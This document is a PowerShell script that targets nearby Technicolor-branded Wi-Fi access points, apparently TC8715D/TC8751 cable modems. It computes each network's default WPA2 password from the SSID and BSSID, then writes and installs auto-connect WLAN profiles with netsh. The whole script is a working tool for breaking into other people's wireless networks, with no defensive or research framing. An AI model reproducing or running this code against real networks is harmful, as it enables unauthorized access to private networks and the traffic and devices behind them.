﻿# If TC8715D
# 3 segment default pass
# TC8715D + last 4 CMAC + last 2 SSID
# If TC8751
# 3 segment default pass
# TC8715 + last 4 CMAC + last 2 SSID
# "$(-join ($target.BSSID1.Split(":")[4..5]))"#BSSID1: e6bd
#BSSID2: e6be
#WANMAC: e6b9
#CMMAC:  e6b7

$WAPs = Get-WAPs
$Targets = $WAPS | where {$_.ssid -like "TC*"}

# Attach DefaultPassword to Targets
ForEach ($Target in $Targets) {
    $Target | Add-Member -Name DefaultPassword -MemberType NoteProperty -Value $("$($Target.SSID.Substring(0,6))" + '{0:X}' -f ([int64]"0x$($Target.BSSID1.replace(':','').Substring($Target.BSSID1.replace(':','').length - 4))") + "$($Target.SSID.Substring($Target.SSID.Length - 2))")
}

# Require user to confirm to proceide
$confirmation = Read-Host "WARNING: THE FOLLOWING IS GOING TO BE NOISY
Are you sure you want to continue? [y/n]"
while ($confirmation -ne "y") {
    if ($confirmation -eq 'n') {
        break
    }
    $confirmation = Read-Host "Are you sure you want to continue? [y/n]"
}

# Creating XMLprofiles
ForEach ($Target in $Targets) {
    $WirelessNetworkSSID = $Target.SSID
    $WirelessNetworkPassword = $Target.DefaultPassword
    $Authentication = 'WPA2PSK' # Could be WPA2
    $Encryption = 'AES'

    # Create the WiFi profile, set the profile to auto connect
    $WirelessProfile = @'
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>{0}</name>
	<SSIDConfig>
		<SSID>
			<name>{0}</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>{2}</authentication>
				<encryption>{3}</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>{1}</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
</WLANProfile>
'@ -f $WirelessNetworkSSID, $WirelessNetworkPassword, $Authentication, $Encryption

    # Create the XML file locally
    $random = Get-Random -Minimum 1111 -Maximum 99999999
    $tempProfileXML = "$env:TEMP\tempProfile$random.xml"
    $WirelessProfile | Out-File $tempProfileXML
    $Target | Add-Member -Name ProfilePath -MemberType NoteProperty -Value $tempProfileXML

    # Add the WiFi profile
    netsh wlan add profile filename="$tempProfileXML" user='all'
}
# Connect to the WiFi network
# netsh wlan connect name="$WirelessNetworkSSID"

# netsh interface show interface | findstr /C:"Wireless" /C:"Name"

# Cleanup profiles
# netsh wlan delete profile 